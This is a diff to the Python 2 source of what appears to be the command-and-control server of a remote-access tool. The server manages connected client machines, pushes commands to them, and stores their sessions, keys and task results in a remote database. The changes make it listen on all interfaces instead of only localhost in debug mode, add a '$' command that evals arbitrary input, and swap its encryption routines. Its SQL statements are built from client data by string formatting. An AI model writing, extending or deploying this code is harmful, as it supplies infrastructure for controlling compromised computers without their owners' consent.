@@ -33,24 +33,28 @@ import pickle
 import socket
 import struct
 import base64
+import signal
 import random
+import hashlib
 import urllib2
 import functools
 import requests
 import tempfile
 import colorama
+import cStringIO
 import threading
 import subprocess
+import collections
 import SocketServer
-from  coinbase.wallet import client
-from Crypto.PublicKey import RSA
-from Crypto.Hash import HMAC, SHA256
-from Crypto.Cipher import AES, PKCS1_OAEP
-from Crypto.Util.number import long_to_bytes, bytes_to_long
+import Crypto.Util
+import Crypto.Hash.HMAC
+import Crypto.Hash.SHA256
+import Crypto.Cipher.AES
+import Crypto.Cipher.PKCS1_OAEP
+import Crypto.PublicKey.RSA
 
 
 BANNER = '''
-
 
 
 ,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
@@ -75,18 +79,11 @@ a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
 
 '''
 
+# globals
 
-# default port for the server to listen on
 PORT = 1337
 
-
-# server is contained to the local network if debugging mode is true
 DEBUG = True
-
-
-# comment the following line to disable colored console
-colorama.init()
-
 
 
 class Server(threading.Thread):
@@ -105,6 +102,7 @@ class Server(threading.Thread):
         self.shell          = threading.Event()
         self.lock           = threading.Lock()
         self.commands       = {
+            '$'             :   self.server_eval_code,
             'back'          :   self.background_client,
             'client'        :   self.select_client,
             'clients'       :   self.list_clients,
@@ -129,7 +127,7 @@ class Server(threading.Thread):
         self.database['session_key'] = self._session_key()
         self.s              = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.s.bind(('localhost', port)) if globals().get('DEBUG') else self.s.bind(('0.0.0.0', port))
+        self.s.bind(('0.0.0.0', port))
         self.s.listen(100)
         self.shell.set()
 
@@ -178,24 +176,6 @@ class Server(threading.Thread):
             self.shell.set()
             return self.run()
 
-    def _pad(self, data, block_size, padding='\x00'):
-        return bytes(data) + (block_size - len(bytes(data)) % block_size) * padding
-
-    def _block(self, data, block_size):
-        return [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
-
-    def _xor(self, a, b):
-        return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(a,b))
-
-    def _obfuscate(self, data):
-        data = bytearray(i for i in reversed(data))
-        z    = self._get_nth_prime(len(data) + 1)
-        return base64.b64encode(''.join([(chr(data.pop()) if i in self._get_primes(z) else os.urandom(1)) for i in xrange(z)]))
-
-    def _deobfuscate(self, block):
-        return bytes().join(chr(bytearray(base64.b64decode(block))[_]) for _ in self._get_primes(len(bytearray(base64.b64decode(block)))))
-
-
     def _get_status(self, c):
         data=['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
                   '{} hours'.format(int((c % 86400.0) / 3600.0)) if int((c % 86400.0) / 3600.0) else str(),
@@ -203,81 +183,43 @@ class Server(threading.Thread):
                   '{} seconds'.format(int(c % 60.0)) if int(c % 60.0) else str()]
         return ', '.join([i for i in data if i])
 
-    def _get_primes(self, n):
-        sieve = numpy.ones(n/3 + (n%6==2), dtype=numpy.bool)
-        for i in xrange(1,int(n**0.5)/3+1):
-            if sieve[i]:
-                k=3*i+1|1
-                sieve[       k*k/3     ::2*k] = False
-                sieve[k*(k-2*(i&1)+4)/3::2*k] = False
-        return numpy.r_[2,3,((3*numpy.nonzero(sieve)[0][1:]+1)|1)]
+    def _pad(self, s, block_size, padding=chr(0)):
+        return bytes(s) + (int(block_size) - len(bytes(s)) % int(block_size)) * bytes(padding)
 
-    def _get_nth_prime(self, p):
-        return (self._get_primes(i)[-1] for i in xrange(int(p*1.5), int(p*15)) if len(self._get_primes(i)) == p).next()     
-
-    def _encrypt_xor(self, data, key):
-        data    = self._pad(data, 8)
-        blocks  = self._block(data, 8)
-        vector  = os.urandom(8)
-        result  = [vector]
-        for block in blocks:
-            block   = self._xor(vector, block)
-            v0, v1  = struct.unpack('!2L', block)
-            k       = struct.unpack('!4L', key[:16])
-            s, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
-            for r in xrange(32):
-                v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (s + k[s & 3]))) & mask
-                s = (s + delta) & mask
-                v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (s + k[s >> 11 & 3]))) & mask
-            output  = vector = struct.pack('!2L', v0, v1)
-            result.append(output)
-        return base64.b64encode(b''.join(result))
-
-    def _decrypt_xor(self, data, key):
-        data    = base64.b64decode(data)
-        blocks  = self._block(data, 8)
-        vector  = blocks[0]
-        result  = []
-        for block in blocks[1:]:
-            v0, v1 = struct.unpack('!2L', block)
-            k = struct.unpack('!4L', key[:16])
-            delta, mask = 0x9e3779b9L, 0xffffffffL
-            s = (delta * 32) & mask
-            for r in xrange(32):
-                v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (s + k[s >> 11 & 3]))) & mask
-                s = (s - delta) & mask
-                v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (s + k[s & 3]))) & mask
-            decode = struct.pack('!2L', v0, v1)
-            output = self._xor(vector, decode)
-            vector = block
-            result.append(output)
-        return ''.join(result).rstrip(b'\0')
-    
-    def _encrypt_aes(self, plaintext, key):
+    def _encrypt_aes(self, data, key):
         try:
-            text        = self._pad(plaintext, AES.block_size)
-            iv          = os.urandom(AES.block_size)
-            cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
-            ciphertext  = iv + cipher.encrypt(text)
-            hmac_sha256 = HMAC.new(key[max(AES.key_size):], msg=ciphertext, digestmod=SHA256).digest()
-            output      = base64.b64encode(ciphertext + hmac_sha256)
-            return output
+            cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
+            ciphertext, tag = cipher.encrypt_and_digest(data)
+            output = b''.join((cipher.nonce, tag, ciphertext))
+            return base64.b64encode(output)
         except Exception as e:
-            return self._error(str(e))
-            
-    def _decrypt_aes(self, ciphertext, key):
-        try:
-            ciphertext  = base64.b64decode(ciphertext.rstrip())
-            iv          = ciphertext[:AES.block_size]
-            cipher      = AES.new(key[:max(AES.key_size)], AES.MODE_CBC, iv)
-            read_hmac   = ciphertext[-SHA256.digest_size:]
-            calc_hmac   = HMAC.new(key[max(AES.key_size):], msg=ciphertext[:-SHA256.digest_size], digestmod=SHA256).digest()
-            output      = cipher.decrypt(ciphertext[AES.block_size:-SHA256.digest_size]).rstrip(b'\0')
-            self._error("HMAC-SHA256 hash authentication check failed - transmission may have been compromised\nExpected: '{}'\nReceived: '{}'".format(calc_hmac, read_hmac)) if calc_hmac != read_hmac else None
-            return output
-        except Exception as e:
-            return self._error(str(e))
+            self._error("{} error: {}".format(self._encrypt_aes.func_name, str(e)))
 
+    def _decrypt_aes(self, data, key):
+        try:
+            data = cStringIO.StringIO(base64.b64decode(data))
+            nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
+            cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
+            return cipher.decrypt_and_verify(ciphertext, tag)
+        except Exception as e:
+            self._error("{} error: {}".format(self._decrypt_aes.func_name, str(e)))
+
+    def _encrypt_server(self, plaintext, key):
+        text        = self._pad(plaintext, Crypto.Cipher.AES.block_size, chr(0))
+        iv          = os.urandom(Crypto.Cipher.AES.block_size)
+        cipher      = Crypto.Cipher.AES.new(key[:max(Crypto.Cipher.AES.key_size)], Crypto.Cipher.AES.MODE_CBC, iv)
+        ciphertext  = iv + cipher.encrypt(text)
+        hmac_sha256 = Crypto.Hash.HMAC.new(key[max(Crypto.Cipher.AES.key_size):], msg=ciphertext, digestmod=Crypto.Hash.SHA256).digest()
+        return base64.b64encode(ciphertext + hmac_sha256)
+
+    def _decrypt_server(self, ciphertext, key):
+        ciphertext  = base64.b64decode(ciphertext)
+        iv          = ciphertext[:Crypto.Cipher.AES.block_size]
+        cipher      = Crypto.Cipher.AES.new(key[:max(Crypto.Cipher.AES.key_size)], Crypto.Cipher.AES.MODE_CBC, iv)
+        read_hmac   = ciphertext[-Crypto.Hash.SHA256.digest_size:]
+        calc_hmac   = Crypto.Hash.HMAC.new(key[max(Crypto.Cipher.AES.key_size):], msg=ciphertext[:-Crypto.Hash.SHA256.digest_size], digestmod=Crypto.Hash.SHA256).digest()
+        print('HMAC-SHA256 hash authentication check failed - transmission may have been compromised') if calc_hmac != read_hmac else None
+        return cipher.decrypt(ciphertext[Crypto.Cipher.AES.block_size:-Crypto.Hash.SHA256.digest_size]).rstrip(chr(0))
 
     # Diffie-Hellman Internet Key Exchange (IKE) - RFC 2631 
     def _session_key(self):
@@ -285,11 +227,11 @@ class Server(threading.Thread):
             # RFC 3526 MOPD group 14 (2048 bit strong prime)
             p   = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
             g   = 2            
-            a   = bytes_to_long(os.urandom(32))            
+            a   = Crypto.Util.number.bytes_to_long(os.urandom(32))            
             Ax  = pow(g, a, p)  # g ^ A mod P 
             Bx  = long(requests.post(self.database['domain'] + self.database['pages']['session'], data={'public_key': hex(Ax).strip('L'), 'id': '0000000000000000000000000000000000000000000000000000000000000000'}).content)
             k   = pow(Bx, a, p) # Bx ^ A mod P 
-            return self._obfuscate(SHA256.new(bytes(k).strip('L')).hexdigest())
+            return Crypto.Hash.SHA256.new(bytes(k).strip('L')).hexdigest()
         except Exception as e:
             return self._error("{} returned error: {}".format(self._session_key.func_name, str(e)))
 
@@ -302,9 +244,9 @@ class Server(threading.Thread):
             self._error("Invalid Client ID: {}".format(client_id))
             self._return()
         try:
-            return getattr(self, '_encrypt_{}'.format(client.info.get('encryption')))(bytes(data), self._deobfuscate(client.session_key))
+            return self._encrypt_aes(data, client.session_key)
         except Exception as e:
-            self._error(str(e))
+            self._error("{} error: {}".format(self.encrypt.func_name, str(e)))
 
     def decrypt(self, data, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
@@ -315,9 +257,9 @@ class Server(threading.Thread):
             self._error("Invalid Client ID: {}".format(client_id))
             self._return()
         try:
-            return getattr(self, '_decrypt_{}'.format(client.info.get('encryption')))(bytes(data), self._deobfuscate(client.session_key))
+            return self._decrypt_aes(data, client.session_key)
         except Exception as e:
-            self._error(str(e))
+            self._error("{} error: {}".format(self.decrypt.func_name, str(e)))
 
     def send_client(self, command, client_id=None):
         if str(client_id).isdigit() and int(client_id) in self.clients:
@@ -395,7 +337,6 @@ class Server(threading.Thread):
                 self.send_client(msg, client.name)
             except Exception as e:
                 self._error('{} returned error: {}'.format(self.sendall_clients.func_name, str(e)))
-        self._return()
     
     def remove_client(self, client_id):
         if not str(client_id).isdigit() or int(client_id) not in self.clients:
@@ -448,13 +389,16 @@ class Server(threading.Thread):
     def quit_server(self):
         self.shell.clear()
         for client in self.get_clients():
-            try:
-                client.shell.set()
-                self.send_client('standby', client.name)
-            except Exception as e:
-                print(str(e))
-        sys.exit()
-        exit()
+            client.shell.set()
+            self.send_client('standby', client.name)
+        _ = os.popen("taskkill /pid {} /f".format(os.getpid()) if os.name is 'nt' else "kill -9 {}".format(os.getpid())).read()
+        sys.exit(0)
+
+    def server_eval_code(self, code):
+        try:
+            return eval(code)
+        except Exception as e:
+            return "Error: %s" % str(e)
 
     def display_settings(self, args=None):
         if not args:
@@ -587,7 +531,7 @@ class Server(threading.Thread):
             self._error("Invalid Client ID: {}".format(client_id))
             self._return()
         try:
-            return SHA256.new(bytes(client.info['id']) + bytes(command) + bytes(time.time())).hexdigest()
+            return hashlib.new('md5', bytes(client.info['id']) + bytes(command) + bytes(time.time())).hexdigest()
         except Exception as e:
             self._error("{} returned error: {}".format(self.new_task_id.func_name, str(e)))
 
@@ -623,10 +567,10 @@ class Server(threading.Thread):
             self._error("{} returned error: {}".format(self.save_task_results.func_name, str(e)))
         self._return()
 
-    def get_current_session(self):
+    def get_current_session(self, *args):
         try:
             if self.database.get('session_key'):
-                return self._deobfuscate(self.database['session_key'])
+                return self.database['session_key']
             else:
                 return "No session key found"
         except Exception as e:
@@ -637,10 +581,13 @@ class Server(threading.Thread):
         try:
             if self.database.get('session_key'):
                 key     = self.database['session_key']
-                query   = self._encrypt_aes(query, self._deobfuscate(key))
-                data    = requests.post(self.database['domain'] + self.database['pages']['query'], data={'query': query}).content
+                crypted = self._encrypt_server(query, key)
+                data    = requests.post(self.database['domain'] + self.database['pages']['query'], data={'query': crypted}).content
                 if data:
-                    output  = self._decrypt_aes(data, self._deobfuscate(key))
+                    try:
+                        output  = self._decrypt_server(data, key)
+                    except:
+                        output  = bytes(data)
                     if output:
                         if not display:
                             return output
@@ -656,18 +603,17 @@ class Server(threading.Thread):
                             else:
                                 self._print(output)
             else:
-                self._error("No_session_key_found")
+                self._error("None")
         except Exception as e:
-            print("{} error: {}".format(self.get_current_session.func_name, str(e)))
+            self._error("{} error: {}".format(self.query_database.func_name, str(e)))
 
     def connection_handler(self):
         connection, addr    = self.s.accept()
-        private             = RSA.generate(2048)
+        private             = Crypto.PublicKey.RSA.generate(2048)
         public              = private.publickey()
         client              = ClientHandler(connection, address=addr, name=self.count, private_key=private, public_key=public)
         self.clients[self.count]  = client
         self.count  += 1
-        sys.stdout.write('\n')
         client.start()
         self.run() if not self.current_client else self.current_client.run()
             
@@ -712,6 +658,7 @@ class ClientHandler(threading.Thread):
         super(ClientHandler, self).__init__()
         self.prompt         = None
         self.connection     = connection
+        self.tasks          = Queue.Queue()
         self.shell          = threading.Event()
         self.lock           = threading.Lock()
         self.name           = kwargs.get('name')
@@ -744,20 +691,13 @@ class ClientHandler(threading.Thread):
         while '\n' not in buf:
             buf += self.connection.recv(1024)
         try:
-            data = threads['server']._decrypt_aes(buf.rstrip(), threads['server']._deobfuscate(self.session_key))
-        except Exception as e1:
-            self._error("AES decryption error: {}".format(str(e1)))
-            try:
-                data = threads['server']._decrypt_xor(buf.rstrip(), threads['server']._deobfuscate(self.session_key))
-            except Exception as e2:
-                self._error("XOR decryption error: {}".format(str(e2)))
-        try:
-            data  = json.loads(data.rstrip())
+            text  = threads['server']._decrypt_aes(buf.rstrip(), self.session_key)
+            data  = json.loads(text.rstrip())
             exist = threads['server'].query_database("SELECT * FROM clients WHERE id='{}'".format(data['id']), display=False)            
             if not exist or len(str(exist)) == 0:
                 query = threads['server'].query_database("INSERT INTO clients ({}) VALUES ({})".format(', '.join(data.keys()), ', '.join(["'{}'".format(v) for v in data.values()])), display=False)
             else:
-                query = threads['server'].query_database("UPDATE clients SET {} WHERE id='{}'".format([", ".join(["{}='{}'".format(k, v) for k, v in data.items()])], data['id']), display=False)
+                query = threads['server'].query_database("UPDATE clients SET {} WHERE id='{}'".format(", ".join(["{}='{}'".format(k, v) for k, v in data.items()]), data['id']), display=False)
             return data
         except Exception as e3:
             self._error("{} returned error: {}".format(self._info.func_name, str(e3)))
@@ -768,16 +708,16 @@ class ClientHandler(threading.Thread):
             query       = threads['server'].query_database("INSERT INTO sessions ({}) VALUES ({})".format(', '.join(['client','session_key','private_key','public_key']), ', '.join(["'{}'".format(v) for v in [self.info['id'], self.session_key, self.private_key.exportKey(), self.public_key.exportKey()]])), display=False)
             session_id  = requests.post(Server.database['domain'] + Server.database['pages']['session'], data={'id': self.info['id']}).content.strip().rstrip()
             with self.lock:
-                print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n\n [+] " + colorama.Fore.RESET + "New connection" + colorama.Style.DIM + "\n\n{:>14}\t\t{}\n{:>15} {:>72}\n".format("Client ID", self.name, "Session ID", session_id) + threads['server']._text_color + threads['server']._text_style)
-            ciphertext  = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(session_id, threads['server']._deobfuscate(self.session_key))
+                print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n\n [+] " + colorama.Fore.RESET + "New connection" + colorama.Style.DIM + "\n\n{:>15}\t\t{}\n{:>15} {:>40}\n".format("Client ID", self.name, "Session ID", session_id) + threads['server']._text_color + threads['server']._text_style)
+            ciphertext  = threads['server']._encrypt_aes(session_id, self.session_key)
             self.connection.sendall(ciphertext + '\n')
             ciphertext  = ""
             while "\n" not in ciphertext:
                 ciphertext += self.connection.recv(1024)
-            plaintext   = getattr(threads['server'], '_decrypt_{}'.format(self.info.get('encryption')))(ciphertext.rstrip(), threads['server']._deobfuscate(self.session_key))
+            plaintext   = threads['server']._decrypt_aes(ciphertext.rstrip(), self.session_key)
             request     = json.loads(plaintext)
             if request.get('request') == 'public_key':
-                response = getattr(threads['server'], '_encrypt_{}'.format(self.info.get('encryption')))(self.public_key.exportKey(), threads['server']._deobfuscate(self.session_key))
+                response = threads['server']._encrypt_aes(self.public_key.exportKey(), self.session_key)
                 self.connection.sendall(response + '\n')
             return session_id
         except Exception as e:
@@ -789,13 +729,13 @@ class ClientHandler(threading.Thread):
         try:
             #RFC 3526 MOPD group 14 (2048 bit strong prime)
             p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
-            a  = bytes_to_long(os.urandom(32))
+            a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
             g  = 2
             Ax = pow(g, a, p)  # Ax = g ^ A mod P
-            self.connection.send(long_to_bytes(Ax))
-            Bx = bytes_to_long(self.connection.recv(256))
+            self.connection.send(Crypto.Util.number.long_to_bytes(Ax))
+            Bx = Crypto.Util.number.bytes_to_long(self.connection.recv(256))
             k  = pow(Bx, a, p) # k = Bx ^ A mod P
-            return threads['server']._obfuscate(SHA256.new(long_to_bytes(k)).hexdigest())
+            return hashlib.new('md5', Crypto.Util.number.long_to_bytes(k)).hexdigest()
         except Exception as e:
             self._error("{} returned error: {}".format(self._session_key, str(e)))
             self._kill()
@@ -826,7 +766,8 @@ class ClientHandler(threading.Thread):
                         else:
                             threads['server'].send_client(command, self.name)
                     elif task.get('result') and 'prompt' not in task.get('command'):
-                        threads['server']._print(task.get('result'))
+                        if threads['server'].current_client.name == self.name:
+                            threads['server']._print(task.get('result'))
                         threads['server'].save_task_results(task)
                     elif threads['server'].exit_status:
                         break
@@ -837,9 +778,9 @@ class ClientHandler(threading.Thread):
                 continue
 
 if __name__ == '__main__':
-    port    = int(PORT)
-    threads = {}
-    threads['server'] = Server(port)
+    colorama.init()
+    threads = collections.OrderedDict()
+    threads['server'] = Server(PORT)
     os.system('cls' if os.name is 'nt' else 'clear')
     print(getattr(colorama.Fore, random.choice(['RED','CYAN','GREEN','YELLOW','WHITE','MAGENTA'])) + BANNER + colorama.Fore.WHITE)
     print(colorama.Fore.YELLOW + "[?] " + colorama.Fore.RESET + "Use 'help' for command usage information\n\n")
